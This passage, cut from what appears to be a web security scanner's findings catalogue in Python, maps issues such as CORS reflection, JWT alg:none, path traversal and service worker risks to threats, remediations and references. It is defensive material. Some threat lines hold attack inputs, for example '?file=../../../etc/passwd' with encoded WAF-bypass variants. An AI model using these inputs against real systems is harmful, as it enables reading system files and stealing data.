            "Set Referrer-Policy: no-referrer or same-origin to prevent token leakage via Referer",
            "Disable URL-based session tracking (jsessionid in URL) in application server config",
            "Store tokens in memory (JS variable) not localStorage if XSS risk is present",
            "Rotate tokens after authentication and set short expiry; invalidate on logout",
        ],
        "references": ["https://cwe.mitre.org/data/definitions/598.html"],
    },
    "api_pagination_abuse": {
        "severity": "HIGH",
        "short": "API Pagination Abuse / Mass Data Extraction",
        "cwe": "CWE-770", "owasp": "A01:2021",
        "threats": [
            "Unlimited page size: limit=99999 dumps entire database table in one unauthenticated request",
            "Total count disclosure: reveals exact dataset size, enabling targeted scraping strategies",
            "Cursor-based bypass: sequential cursor enumeration extracts all records without pagination",
            "No rate limiting on pagination: automated scrapers can dump millions of records undetected",
            "Offset enumeration: offset=0,1000,2000... extracts entire user table including PII",
        ],
        "remediation": [
            "Enforce maximum page size server-side (e.g., max 100 records per request, default 20)",
            "Reject or cap requests exceeding the maximum; never silently return all records",
            "Avoid exposing total count in responses where dataset enumeration is a risk",
            "Use opaque cursor tokens that cannot be guessed or incremented",
            "Apply rate limiting and authentication to all paginated API endpoints",
        ],
        "references": ["https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html"],
    },
    "content_security_framing": {
        "severity": "HIGH",
        "short": "Insufficient Content Framing Protection",
        "cwe": "CWE-1021", "owasp": "A05:2021",
        "threats": [
            "No X-Frame-Options or CSP frame-ancestors: page frameable in any site — clickjacking enabled",
            "frame-ancestors: *: explicitly allows any origin to embed this page in an iframe",
            "XFO ALLOW-FROM without CSP: deprecated XFO directive ignored by modern browsers",
            "XFO/CSP inconsistency: server sends both with conflicting values — browser uses CSP, XFO ignored",
            "<object>/<embed> tags: plugin content bypasses framing protections and CSP sandbox",
        ],
        "remediation": [
            "Set Content-Security-Policy: frame-ancestors 'none' or frame-ancestors 'self'",
            "Optionally keep X-Frame-Options: DENY as defense-in-depth for older browsers",
            "Remove XFO: ALLOW-FROM entirely — replace with CSP frame-ancestors with explicit origin list",
            "Remove or restrict <object> and <embed> tags; use HTML5 equivalents instead",
            "Apply framing protection consistently across all pages, not just the home page",
        ],
        "references": ["https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html"],
    },
    "oauth_implicit_flow": {
        "severity": "HIGH",
        "short": "OAuth Implicit Flow Token Leakage",
        "cwe": "CWE-384", "owasp": "A02:2021",
        "threats": [
            "access_token in URL fragment (#access_token=): logged by servers, leaked via Referer, visible in browser history",
            "Implicit flow with long-lived token: no refresh token mechanism means longer exposure window",
            "Fragment token accessible to JS: any XSS on redirect_uri page exfiltrates token from window.location.hash",
            "Token replay: implicit tokens without binding can be replayed from different IP/device",
            "Discovery advertises implicit grant: clients may use it — enables token fragment attacks",
        ],
        "remediation": [
            "Migrate from implicit flow (response_type=token) to authorization_code+PKCE",
            "Remove 'implicit' from grant_types_supported in OAuth discovery document",
            "Use short-lived access tokens with refresh token rotation for SPA flows",
            "Implement token binding or DPoP (Demonstration of Proof-of-Possession)",
            "Set redirect_uri allowlist to prevent token delivery to attacker-controlled origins",
        ],
        "references": ["https://oauth.net/2/grant-types/implicit/", "https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics"],
    },
    "web_worker_security_deep": {
        "severity": "HIGH",
        "short": "Web Worker Security Misconfiguration",
        "cwe": "CWE-668", "owasp": "A05:2021",
        "threats": [
            "SharedArrayBuffer without COOP+COEP: enables Spectre-class timing attacks to read cross-origin memory",
            "Atomics.wait abuse: high-resolution timer reconstructed via shared memory enables cache timing attacks",
            "External importScripts(): CDN compromise executes arbitrary code in Worker with access to all messages",
            "postMessage('*'): sensitive data in Worker messages sent to any window on any origin",
            "Worker URL from URL param: attacker-controlled worker script — arbitrary code execution in worker context",
        ],
        "remediation": [
            "Set Cross-Origin-Opener-Policy: same-origin and Cross-Origin-Embedder-Policy: require-corp before using SharedArrayBuffer",
            "Never import external scripts in Workers; bundle required code at build time",
            "Specify explicit targetOrigin in postMessage() calls — never use '*' for sensitive messages",
            "Validate and restrict Worker script URLs to same-origin or known paths",
            "Implement Content-Security-Policy: worker-src 'self' to restrict Worker source origins",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/SharedArrayBuffer"],
    },
    "javascript_template_literal": {
        "severity": "HIGH",
        "short": "JavaScript Template Literal Injection (DOM XSS)",
        "cwe": "CWE-79", "owasp": "A03:2021",
        "threats": [
            "eval() with interpolated template: attacker controls template expression, executes arbitrary JS in page context",
            "innerHTML from template literal: DOM XSS — attacker injects HTML/script via URL parameter",
            "document.write() with template: script/HTML injection when interpolated value is user-controlled",
            "window.location from template: open redirect if URL component interpolated from user input",
            "script.src from template: attacker controls loaded script URL, achieves arbitrary code execution",
        ],
        "remediation": [
            "Never use eval() with template literals containing user-controlled interpolation",
            "Use textContent instead of innerHTML for user-controlled content; DOMPurify for HTML",
            "Sanitize all URL components before interpolating into window.location assignments",
            "Implement Content-Security-Policy with script-src to block unauthorized scripts",
            "Use Trusted Types API to enforce safe DOM sinks at the browser level",
        ],
        "references": ["https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html"],
    },
    "cors_origin_reflection": {
        "severity": "HIGH",
        "short": "CORS Dynamic Origin Reflection",
        "cwe": "CWE-942", "owasp": "A05:2021",
        "threats": [
            "Origin header reflected with ACAC: true: any origin makes credentialed requests — CSRF impossible to defend against",
            "Dynamic ACAO mirrors attacker origin: cross-origin reads of authenticated API responses",
            "Reflected null origin with credentials: null origin in sandboxed iframe can read authenticated responses",
            "Wildcard ACAO with credentials: forbidden by spec but some servers mis-implement; attacker reads auth responses",
            "Subdomain wildcard reflection: compromise of any subdomain enables cross-origin credential reads",
        ],
        "remediation": [
            "Maintain an explicit allowlist of trusted origins — never reflect the request Origin header",
            "Never combine Access-Control-Allow-Credentials: true with dynamic ACAO",
            "Use CORS middleware that compares Origin against a fixed allowlist, not string reflection",
            "Reject 'null' origin for credentialed requests — sandboxed iframes should not access credentials",
            "Audit all API endpoints for CORS headers; consider API gateway with centralized CORS policy",
        ],
        "references": ["https://portswigger.net/web-security/cors"],
    },
    "jwt_token_exposure": {
        "severity": "HIGH",
        "short": "JWT Token Exposed or Weakly Signed",
        "cwe": "CWE-347", "owasp": "A02:2021",
        "threats": [
            "alg:none JWT: no signature verification — attacker forges tokens by setting algorithm to none",
            "HMAC JWT in page body: if key is guessable or leaked, attacker generates valid tokens for any user",
            "JWT in URL parameter: token in server logs, browser history, Referer header — lateral theft",
            "JWT in localStorage: XSS exfiltrates token; persists across tabs; accessible to all page scripts",
            "HMAC symmetric key reuse: same secret for signing and verification — compromise of one service exposes all",
        ],
        "remediation": [
            "Reject tokens with alg:none — whitelist permitted algorithms (RS256, ES256 preferred over HS256)",
            "Use asymmetric signatures (RS256/ES256) so public keys can be distributed without exposing signing key",
            "Store JWTs in HttpOnly cookies, not localStorage or URL parameters",
            "Implement short expiry (access: 15 min, refresh: 24h) with rotation and revocation",
            "Use strong, randomly generated signing secrets (minimum 256-bit for HMAC-SHA256)",
        ],
        "references": ["https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html"],
    },
    "http_security_headers_deep": {
        "severity": "MEDIUM",
        "short": "HTTP Security Header Configuration Issues",
        "cwe": "CWE-693", "owasp": "A05:2021",
        "threats": [
            "HSTS max-age < 6 months: short expiry window leaves users unprotected after cache invalidation",
            "HSTS without includeSubDomains: HTTP subdomains can hijack cookies set without Domain= attribute",
            "Missing X-Content-Type-Options: nosniff: MIME-sniffing enables content injection via file uploads",
            "Referrer-Policy: unsafe-url: full URL including auth tokens sent to all cross-origin destinations",
            "Missing Permissions-Policy: browser APIs (camera/mic/geolocation) available to embedded third-party scripts",
        ],
        "remediation": [
            "Set HSTS: max-age=31536000; includeSubDomains; preload — submit to HSTS preload list",
            "Set X-Content-Type-Options: nosniff on all responses",
            "Set Referrer-Policy: strict-origin-when-cross-origin or no-referrer",
            "Set Permissions-Policy: camera=(), microphone=(), geolocation=() to deny all by default",
            "Use securityheaders.com to grade and track header configuration over time",
        ],
        "references": ["https://securityheaders.com", "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers"],
    },
    "srcdoc_injection": {
        "severity": "HIGH",
        "short": "srcdoc/iframe Injection Vulnerability",
        "cwe": "CWE-79", "owasp": "A03:2021",
        "threats": [
            "javascript: iframe src: script executes in parent page context regardless of CSP if not blocked",
            "srcdoc with embedded <script>: script runs in null origin; CSP frame-src 'none' doesn't block srcdoc",
            "srcdoc from URL param: attacker controls iframe content via URL manipulation — stored/reflected XSS",
            "data:text/html iframe: in older browsers executes in parent origin; modern browsers sandbox varies",
            "Blob URL iframes: dynamic HTML content loaded via createObjectURL may contain attacker-controlled data",
        ],
        "remediation": [
            "Set Content-Security-Policy: frame-src 'self' and sandbox on all iframes using srcdoc",
            "Add sandbox attribute to all iframes — allow-scripts only when absolutely necessary",
            "Never assign srcdoc from URL parameters, location.search, or any user-controlled source",
            "Set X-Frame-Options: DENY or CSP frame-ancestors 'none' on sensitive pages",
            "Validate and sanitize any content placed in srcdoc using DOMPurify or equivalent",
        ],
        "references": ["https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-srcdoc"],
    },
    "web_crypto_weaknesses": {
        "severity": "HIGH",
        "short": "WebCrypto API Misuse / Weak Cryptography",
        "cwe": "CWE-330", "owasp": "A02:2021",
        "threats": [
            "Math.random() for tokens/secrets: predictable values — attacker brute-forces session tokens",
            "AES-ECB mode: encrypting same plaintext blocks produces same ciphertext — pattern leakage",
            "Static/hardcoded IV for AES-GCM: IV reuse breaks GCM authentication — enables decryption and forgery",
            "SHA-1/MD5 hashing: collision-vulnerable — certificate forgery, hash extension, preimage attacks",
            "Timestamp as entropy source: Date.now() seed is predictable within milliseconds",
        ],
        "remediation": [
            "Use crypto.getRandomValues() for all cryptographic randomness requirements",
            "Use AES-GCM (preferred) or AES-CBC with PKCS7 padding — never AES-ECB",
            "Generate a unique random 12-byte IV for every encryption operation with AES-GCM",
            "Use SHA-256 or SHA-3 for all hashing; SHA-512 for password-derived key functions",
            "Use PBKDF2 or Argon2 for key derivation from passwords",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto"],
    },
    "autocomplete_security": {
        "severity": "LOW",
        "short": "Insecure Autocomplete on Sensitive Form Fields",
        "cwe": "CWE-522", "owasp": "A02:2021",
        "threats": [
            "Password without autocomplete=off: browser stores cleartext password in autocomplete database",
            "CC number without autocomplete=off: card details saved in browser — stolen by local attacker or malware",
            "Shared device risk: browser auto-fills credentials into form for next user of shared computer",
            "API key field with autocomplete: developer's API key suggested to other users on shared browser",
            "Phishing amplification: browser autofill triggered on phishing page cloned with same field names",
        ],
        "remediation": [
            "Set autocomplete='new-password' on password change/creation fields",
            "Set autocomplete='current-password' on login password fields (enables password manager integration)",
            "Set autocomplete='off' on credit card CVV and one-time code fields",
            "Set autocomplete='off' on API key, secret, and token input fields",
            "Note: browsers may ignore autocomplete='off' — consider using JavaScript to clear fields after use",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/autocomplete"],
    },
    "api_documentation_exposure": {
        "severity": "HIGH",
        "short": "Public API Documentation Exposure",
        "cwe": "CWE-200", "owasp": "A05:2021",
        "threats": [
            "Swagger UI exposed: complete API blueprint available — attacker discovers all endpoints, parameters, auth",
            "OpenAPI spec accessible: machine-readable specification enables automated fuzzing and attack generation",
            "Sensitive endpoints in docs: /admin, /internal, /config paths revealed — direct attack surface expansion",
            "Postman collection exposed: includes environment variables with credentials, API keys, base URLs",
            "ReDoc accessible: renders full API documentation — facilitates targeted exploitation planning",
        ],
        "remediation": [
            "Restrict Swagger UI and OpenAPI spec endpoints to authenticated users or internal network only",
            "Remove documentation endpoints from production deployment or serve from separate authenticated service",
            "Never include credentials or API keys in Postman collections committed to repositories or served publicly",
            "Implement IP allowlisting for API documentation pages in WAF or reverse proxy",
            "Audit what endpoints are documented — remove internal/admin endpoints from public-facing docs",
        ],
        "references": ["https://owasp.org/www-project-api-security/"],
    },
    "server_sent_events_security": {
        "severity": "HIGH",
        "short": "SSE Stream Security Misconfiguration",
        "cwe": "CWE-284", "owasp": "A01:2021",
        "threats": [
            "CORS wildcard on SSE endpoint: any origin subscribes to real-time data stream, receives PII or private events",
            "Unauthenticated SSE stream: attacker accesses event feed without credentials, receives private notifications",
            "Sensitive data in SSE events: tokens, emails, session IDs broadcast in plaintext event stream",
            "Cacheable SSE stream: proxy caches event replay, delivering stale private data to wrong users",
            "Missing auth check on /events: server push channel bypasses application access controls",
        ],
        "remediation": [
            "Restrict SSE endpoints with the same authentication middleware used for REST API routes",
            "Set specific CORS origins (not *) on event stream endpoints — verify Origin server-side",
            "Add Cache-Control: no-store, no-cache to all SSE responses to prevent proxy caching",
            "Never include raw tokens, passwords, or PII in SSE data payloads — use opaque event IDs",
            "Implement per-user event channels with server-side tenant isolation, not a single broadcast stream",
        ],
        "references": ["https://owasp.org/www-project-api-security/", "https://html.spec.whatwg.org/multipage/server-sent-events.html"],
    },
    "path_traversal_deep": {
        "severity": "CRITICAL",
        "short": "Path Traversal / Arbitrary File Read",
        "cwe": "CWE-22", "owasp": "A01:2021",
        "threats": [
            "?file=../../../etc/passwd returns passwd content: full system user enumeration, UID mapping",
            "?path= with encoded sequences (..%2F, %252e): WAF bypass leads to arbitrary file read",
            "PHP source code returned via traversal: exposes credentials, DB passwords, application secrets",
            "Windows hosts file read: confirms OS type and internal network topology",
            "Error response leaks full server path: filesystem layout disclosed, aids targeted traversal",
        ],
        "remediation": [
            "Never construct file paths from user input — use a file ID mapped to server-side path allowlist",
            "Resolve canonical paths and verify they start with the expected base directory before opening",
            "Strip all traversal sequences including encoded variants (%2F, %252F, %c0%af) via allowlist, not blocklist",
            "Run application with least-privilege OS user — no access to /etc, /proc, or system directories",
            "Return generic error pages for missing files — never include the attempted path in the response",
        ],
        "references": ["https://owasp.org/www-community/attacks/Path_Traversal", "https://cwe.mitre.org/data/definitions/22.html"],
    },
    "wasm_security_deep": {
        "severity": "HIGH",
        "short": "WebAssembly Security Risk",
        "cwe": "CWE-494", "owasp": "A08:2021",
        "threats": [
            "WASM URL from URL parameter: attacker substitutes malicious WASM module via URL manipulation",
            "WASM fetched over HTTP: MITM intercepts fetch, replaces binary with backdoored WASM module",
            "WebAssembly.compile(atob(...)): inline base64 WASM bypasses CSP connect-src directive",
            "eval() with WASM string: dynamic WASM generation evades static analysis and CSP script-src",
            "Wrong WASM Content-Type: some browsers refuse instantiation, causing runtime failures in production",
        ],
        "remediation": [
            "Never derive WASM module URLs from URL parameters — hardcode paths in application source",
            "Always fetch WASM modules over HTTPS — include in Subresource Integrity checks where possible",
            "Serve WASM files with Content-Type: application/wasm and X-Content-Type-Options: nosniff",
            "Add CSP connect-src and script-src directives that restrict which WASM modules can be loaded",
            "Audit inline base64 WASM payloads for obfuscated code — treat as equivalent to inline scripts",
        ],
        "references": ["https://webassembly.org/docs/security/", "https://owasp.org/www-project-top-ten/"],
    },
    "content_type_sniffing": {
        "severity": "MEDIUM",
        "short": "MIME Type Sniffing / Content-Type Confusion",
        "cwe": "CWE-430", "owasp": "A05:2021",
        "threats": [
            "Missing X-Content-Type-Options: nosniff: IE/legacy browsers sniff MIME, execute text/plain as HTML",
            "Upload endpoint without nosniff: uploaded SVG/HTML file served with wrong MIME executed as script",
            "JSON with HTML tags without nosniff: response rendered as HTML, enabling stored XSS via JSON API",
            "text/plain containing JavaScript: MIME sniffing causes browser to execute as script",
            "Polyglot file served as image: browser executes embedded HTML/JS when rendered via sniffing",
        ],
        "remediation": [
            "Set X-Content-Type-Options: nosniff on every HTTP response — add as a global middleware header",
            "Validate MIME type of uploaded files server-side using magic bytes, not file extension or client header",
            "Store user-uploaded files on a separate domain (e.g., static.example.com) to isolate execution context",
            "Set explicit, correct Content-Type on all responses — never rely on browser sniffing",
            "Use CSP default-src to restrict what content types can execute, even if sniffing occurs",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options", "https://owasp.org/www-community/attacks/MIME_sniffing"],
    },
    "service_worker_security_deep": {
        "severity": "HIGH",
        "short": "Service Worker Security Risk",
        "cwe": "CWE-923", "owasp": "A04:2021",
        "threats": [
            "skipWaiting + fetch intercept: new service worker activates immediately, can serve stale or attacker-modified cached responses to users without reload",
            "message handler without origin check: malicious pages send arbitrary commands to service worker, manipulating cached resources",
            "Auth tokens cached in service worker: session credentials persist in Cache Storage across logout — cleartext token recovery after session ends",
            "eval() in service worker: code injection into SW execution context bypasses CSP and executes with page origin trust",
            "HTTP importScripts(): MITM attack on SW dependency fetch replaces worker script with attacker-controlled code",
        ],
        "remediation": [
            "Avoid skipWaiting() unless you have a clear user-visible reload UX — stale SW can serve outdated security patches",
            "Always check event.origin in service worker message handlers before processing event.data",
            "Never cache authentication headers, tokens, or credentials in Cache Storage — use short-lived session cookies instead",
            "Include a strict CSP on service worker responses: disallow eval and restrict importScripts to same origin only",
            "Serve service worker scripts over HTTPS with strong caching headers and Subresource Integrity on imported scripts",
        ],
        "references": ["https://w3c.github.io/ServiceWorker/", "https://owasp.org/www-project-web-security-testing-guide/"],
    },
    "trusted_types_csp": {
        "severity": "MEDIUM",
        "short": "Trusted Types CSP Not Enforced",
        "cwe": "CWE-79", "owasp": "A03:2021",
        "threats": [
            "DOM XSS sinks without Trusted Types: innerHTML/eval/document.write allow arbitrary string injection without platform-level validation",
            "Trusted Types API used without CSP enforcement: opt-in usage bypassed by any legacy code path that skips createPolicy()",
            "No trusted-types allowlist: any policy name can be created, defeating the purpose of named policy control",
            "Third-party scripts bypass Trusted Types: external libraries that use DOM sinks bypass your own policy if CSP isn't enforced globally",
            "Missing Trusted Types enables stored XSS escalation: without sink-level enforcement, XSS payloads survive sanitization gaps",
        ],
        "remediation": [
            "Add 'require-trusted-types-for script' to CSP — this forces all DOM sinks to accept only TrustedHTML/TrustedScript objects",
            "Define a 'trusted-types' allowlist in CSP: 'trusted-types policy-name' restricts which policies can be created",
            "Migrate innerHTML usage to textContent for text, or use TrustedHTML from a strict createPolicy() for HTML",
            "Use the Trusted Types violation report endpoint to identify and fix non-compliant code before enforcing in report-only mode",
            "Audit third-party scripts for DOM sink usage — wrap in a Trusted Types-aware integration layer",
        ],
        "references": ["https://w3c.github.io/trusted-types/dist/spec/", "https://web.dev/trusted-types/"],
    },
    "http_early_hints_security": {
        "severity": "MEDIUM",
        "short": "HTTP 103 Early Hints Path Disclosure",
        "cwe": "CWE-200", "owasp": "A05:2021",
        "threats": [
            "Sensitive paths in Link headers: /admin, /internal, /api preload hints enumerate internal structure before page loads",
            "External preload enabling tracking: third-party servers receive connection requests for every page visit via preload hints",
            "Credentials embedded in preload URL: basic auth in Link header URL exposes credentials to any observer",
            "Cache poisoning via preload: attacker manipulates cached preloaded resources to serve malicious content",
            "Internal service discovery: Link preload headers reveal backend service URLs, microservice topology, CDN origins",
        ],
        "remediation": [
            "Audit all Link: preload headers — remove paths that expose internal service URLs or admin endpoints",
            "Restrict preload hints to same-origin resources or trusted CDNs with SRI hashes",
            "Never embed credentials in preload URL — use cookie-based auth for preloaded resources",
            "Review 103 Early Hints responses in staging before deploying — they're sent before the main response is processed",
            "Monitor Link headers in CSP violation reports — unexpected preloads may indicate cache poisoning",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/103", "https://www.rfc-editor.org/rfc/rfc8297"],
    },
    "reporting_api_security": {
        "severity": "MEDIUM",
        "short": "Reporting API External Endpoint Leak",
        "cwe": "CWE-200", "owasp": "A05:2021",
        "threats": [
            "Report-To with external endpoint: CSP violations sent to third party reveal blocked resource URLs, inline script violations, and user browsing patterns",
            "NEL include_subdomains: network error reports collected from all subdomains including internal/staging services",
            "High NEL success_fraction: frequent navigation data sent to reporting endpoint — privacy leak of user activity",
            "Long max_age on Report-To: stale reporting endpoints persist in browser cache after endpoint rotation, sending reports to defunct/attacker-controlled server",
            "CSP report-uri external: violation reports contain the URL of the page that triggered the violation — user path disclosure to third party",
        ],
        "remediation": [
            "Host your own reporting endpoint (e.g., /csp-report) instead of using third-party reporting services",
            "If using a third-party reporting service, verify their privacy policy and data handling for CSP violation payloads",
            "Set NEL include_subdomains: false unless you explicitly need subdomain error monitoring",
            "Keep success_fraction low (0-0.01) to minimize navigation data sent to reporting endpoints",
            "Rotate Report-To endpoints promptly and set max_age ≤ 86400 to minimize stale endpoint lifetime",
        ],
        "references": ["https://w3c.github.io/reporting/", "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Report-To"],
    },
    "idle_detection_api_security": {
        "severity": "MEDIUM",
        "short": "Idle Detection API Privacy Risk",
        "cwe": "CWE-359", "owasp": "A07:2021",
        "threats": [
            "Idle state transmitted to server: device presence/activity sent to backend enables employee monitoring, session recording, surveillance",
            "Short threshold (<60s): aggressive polling reveals fine-grained user activity patterns beyond spec intent",
            "No privacy notice: users unaware device idle detection is active — violates GDPR consent requirements for sensitive data",
            "Cross-tab correlation: idle state enables correlating multiple tabs/windows from same user for fingerprinting",
            "Session expiry bypass: idle detection used to extend session without real user activity verification",
        ],
        "remediation": [
            "Only request idle detection permission when the user explicitly requests a feature that needs it (e.g., 'enable away status')",
            "Display a clear privacy notice before calling IdleDetector.requestPermission() explaining what data is collected and why",
            "Never transmit idle/screen state to analytics or third-party services — keep it client-side only",
            "Set threshold at 60s minimum (W3C spec floor) and choose the highest threshold that meets your UX requirement",
            "Revoke idle detection permission and stop the detector when the user logs out or the feature is disabled",
        ],
        "references": ["https://wicg.github.io/idle-detection/", "https://developer.mozilla.org/en-US/docs/Web/API/Idle_Detection_API"],
    },
    "network_information_security": {
        "severity": "MEDIUM",
        "short": "Network Information API Fingerprinting",
        "cwe": "CWE-359", "owasp": "A07:2021",
        "threats": [
            "Connection type sent to analytics: effectiveType/downlink/rtt creates device fingerprint for cross-site tracking without cookies",
            "Adaptive payload based on connection: attacker on 'slow' network receives stripped payload with fewer security controls",
            "Third-party tracking: connection data in analytics calls enables ad networks to profile users across sites",
            "Session correlation: stable connection characteristics correlate authenticated and anonymous sessions",
            "Privacy violation: network speed reveals device location and carrier information",
        ],
        "remediation": [
            "Treat Network Information API data as sensitive — never send connection attributes to third-party analytics",
            "If adaptive loading is needed, make security-relevant features (CSP, anti-CSRF) invariant across connection types",
            "Avoid storing connection type in server-side session data — it constitutes unnecessary personal data collection",
            "Review third-party script integrations that might automatically capture navigator.connection properties",
            "Test security controls on simulated slow connections in DevTools — verify they are not stripped in 'lite' mode",
        ],
        "references": ["https://wicg.github.io/netinfo/", "https://developer.mozilla.org/en-US/docs/Web/API/Network_Information_API"],
    },
    "cache_api_security": {
        "severity": "HIGH",
        "short": "Cache API Sensitive Data Persistence",
        "cwe": "CWE-312", "owasp": "A02:2021",
        "threats": [
            "Auth tokens cached in Cache Storage: JWT/Bearer tokens persist after logout, recoverable by same-origin scripts",
            "Sensitive API endpoints cached: /api/user, /account responses stored in browser, accessible on shared devices after session ends",
            "No cache clear on logout: user data persists in Cache Storage until the cache is explicitly deleted",
            "Cache Storage accessible to service workers: malicious injected SW can read all cached responses including auth data",
            "Predictable cache names: attackers crafting XSS payloads target known cache names (e.g., 'auth-cache') for token extraction",
        ],
        "remediation": [
            "Never cache responses that include Authorization headers, Set-Cookie responses, or user-specific data",
            "Call caches.delete(CACHE_NAME) on logout for all caches containing user-specific responses",
            "Set Cache-Control: no-store on all authenticated API responses — prevents both HTTP cache and Cache API caching",
            "Use a versioned cache name and delete old versions during SW install to prevent stale auth data accumulation",
            "Audit service worker fetch handlers to ensure auth endpoints return fresh uncached responses",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/Cache", "https://www.w3.org/TR/service-workers/#cache-objects"],
    },
    "credential_management_security": {
        "severity": "HIGH",
        "short": "Credential Management API Misuse",
        "cwe": "CWE-522", "owasp": "A07:2021",
        "threats": [
            "Hardcoded password in PasswordCredential: plaintext credential visible in JS source to any script on page",
            "Silent mediation without MFA check: credentials.get(mediation:'silent') re-authenticates without user awareness, bypassing MFA",
            "No preventSilentAccess() on logout: after logout, silent credential retrieval re-authenticates user without interaction",
            "Credential Management over HTTP: API requires HTTPS; HTTP deployment means credentials silently unavailable or exposed",
            "FederatedCredential without OAuth PKCE: implicit-flow federation via Credential Management inherits OAuth implicit flow risks",
        ],
        "remediation": [
            "Never pass hardcoded credentials to PasswordCredential — always use form-submitted values",
            "Call navigator.credentials.preventSilentAccess() on all logout/sign-out paths to disable auto-sign-in",
            "After mediation:'silent' credential retrieval, still verify the session server-side before granting access",
            "Ensure Credential Management API is only used over HTTPS — fail gracefully on HTTP",
            "Pair FederatedCredential with Authorization Code + PKCE flow rather than implicit flow",
        ],
        "references": ["https://w3c.github.io/webappsec-credential-management/", "https://developer.mozilla.org/en-US/docs/Web/API/Credential_Management_API"],
    },
    "permissions_api_security": {
        "severity": "MEDIUM",
        "short": "Permissions API Fingerprinting",
        "cwe": "CWE-359", "owasp": "A07:2021",
        "threats": [
            "Bulk permission enumeration: querying camera+mic+location+clipboard state creates unique fingerprint across browser sessions",
            "Permission state transmitted to server: combination of granted/denied permissions sent to analytics uniquely identifies device",
            "Sensitive permission without context: requesting camera/mic permissions outside user interaction pattern feels coercive",
            "Cross-site correlation: stable permission state fingerprint correlates authenticated and anonymous sessions",
            "Permission state reveals user behavior: 'denied' state shows prior user decisions about privacy-sensitive features",
        ],
        "remediation": [
            "Only query permission state when needed for a specific user-triggered action — not on page load",
            "Never transmit permission states to server-side analytics — this constitutes device fingerprinting",
            "Request sensitive permissions (camera, microphone) only in direct response to user gesture with clear UI context",
            "Limit permission queries to what the feature actually needs — do not enumerate all permissions",
            "Implement permission prompts with clear explanations of why access is needed and how it will be used",
        ],
        "references": ["https://w3c.github.io/permissions/", "https://developer.mozilla.org/en-US/docs/Web/API/Permissions_API"],
    },
    "lock_api_security": {
        "severity": "MEDIUM",
        "short": "Web Locks API DoS Risk",
        "cwe": "CWE-667", "owasp": "A04:2021",
        "threats": [
            "Lock without AbortSignal: queued lock requests pile up if the holder crashes, exhausting browser resources",
            "steal:true: forcibly breaking locks can cause data corruption in concurrent IndexedDB or Cache API operations",
            "Lock name from URL input: attacker controls lock namespace, causing denial-of-service via lock contention",
            "Lock held in infinite loop: service worker or tab holding a lock indefinitely blocks all other requestors",
            "Lock state enumeration: locks.query() reveals application state machine details useful for timing attacks",
        ],
        "remediation": [
            "Always pass an AbortSignal to navigator.locks.request() with a timeout to prevent indefinite queuing",
            "Use steal:true only in explicit error recovery flows, never in normal operation paths",
            "Never derive lock names from URL parameters or user input — use application-defined constant names",
            "Ensure lock holders release the lock promptly — use try/finally to guarantee release even on error",
            "Prefer shared mode locks when exclusive access is not needed — reduces contention risk",
        ],
        "references": ["https://w3c.github.io/web-locks/", "https://developer.mozilla.org/en-US/docs/Web/API/Web_Locks_API"],
    },
    "payment_request_security": {
        "severity": "CRITICAL",
        "short": "Payment Request API Security Risk",
        "cwe": "CWE-319", "owasp": "A02:2021",
        "threats": [
            "Payment Request over HTTP: payment data visible to MITM; Payment Request API explicitly requires HTTPS",
            "basic-card method exposes raw card numbers: page JavaScript receives PAN, CVV, expiry — PCI DSS scope expansion",
            "paymentResponse logged to console: billing address, card details exposed in DevTools to any page script",
            "No HSTS on payment page: SSL stripping on first visit blocks Payment Request or downgrades to HTTP",
            "Card number in JavaScript: storing or logging card numbers in JS violates PCI DSS requirements 3.2 and 6.4",
        ],
        "remediation": [
            "Require HTTPS on all payment pages and enforce with HSTS (max-age ≥ 31536000, includeSubDomains)",
            "Never use 'basic-card' — use payment service provider-specific methods (Stripe, PayPal, Google Pay) to avoid receiving raw card data",
            "Never log paymentResponse or any card data to console.log — remove all payment-related debug logging before production",
            "Implement Content Security Policy to prevent exfiltration of payment data via XSS",
            "Ensure PCI DSS SAQ A-EP or higher compliance if JavaScript interacts with any payment form elements",
        ],
        "references": ["https://www.w3.org/TR/payment-request/", "https://www.pcisecuritystandards.org/"],
    },
    "file_system_access_security": {
        "severity": "HIGH",
        "short": "File System Access API Excessive Scope",
        "cwe": "CWE-552", "owasp": "A01:2021",
        "threats": [
            "showDirectoryPicker grants full directory access: user may unknowingly grant read/write to all files in ~/Documents or ~/Desktop",
            "FileHandle stored in localStorage: XSS attacker reads persisted handles, accessing user files without another picker dialog",
            "Recursive directory delete: rm -rf equivalent in browser, irreversibly deletes user data",
            "File path transmitted to server: directory structure and file naming reveals user's local machine configuration",
            "startIn:'desktop' guides PII exposure: directing picker to Desktop/Documents increases chance of sensitive file selection",
        ],
        "remediation": [
            "Prefer showOpenFilePicker over showDirectoryPicker — request access to individual files, not entire directories",
            "Never store FileHandle objects in localStorage/sessionStorage — they should not persist across sessions",
            "Gate any .remove({recursive:true}) behind multiple confirmation dialogs with explicit content preview",
            "Never transmit file paths to server — only transmit file contents, and only what the user explicitly chose to upload",
            "Use startIn:'downloads' or a task-specific directory suggestion rather than broad directories like desktop or documents",
        ],
        "references": ["https://wicg.github.io/file-system-access/", "https://developer.mozilla.org/en-US/docs/Web/API/File_System_Access_API"],
    },
    "web_usb_security": {
        "severity": "HIGH",
        "short": "WebUSB Unauthorized Device Access",
        "cwe": "CWE-284", "owasp": "A01:2021",
        "threats": [
            "Empty device filters: all connected USB devices shown in picker; user grants access to unintended device",
            "Device serial number access: USB serial numbers uniquely identify physical hardware across sessions for persistent fingerprinting",
            "Hardware fingerprint transmitted: vendorId/productId/serialNumber sent to server — physical device identity disclosed",
            "Firmware write via WebUSB: malicious page can permanently alter device firmware if user is tricked into granting access",
